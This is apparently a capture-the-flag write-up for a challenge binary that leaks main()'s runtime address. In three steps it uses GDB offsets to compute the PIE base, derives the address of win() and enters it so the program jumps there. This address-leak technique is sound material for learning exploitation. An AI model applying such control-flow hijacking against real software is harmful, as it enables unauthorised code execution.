# Step 1
Use GDB to find the local addresses of functions.

```
(webshell)

gdb ./vuln
(gdb) info functions
```

local address of main(): 0x000000000000133d  
local address of win(): 0x00000000000012a7  

# Step 2
Run the challenge to get the runtime address of main(). Use the known local addresses to calculate the address of win().

```
(webshell - running ./vuln)

Address of main: 0x587f8671f33d
Enter the address to jump to, ex => 0x12345:
```

address of main(): 0x587f8671f33d  
baseline address = address of main() - local address of main() = 0x587f8671e000  
address of win() = baseline address + local address of win() = 0x587f8671f2a7  

# Step 3
Input the address of win().

```
(webshell - running ./vuln)

Enter the address to jump to, ex => 0x12345: 0x587f8671f2a7
```
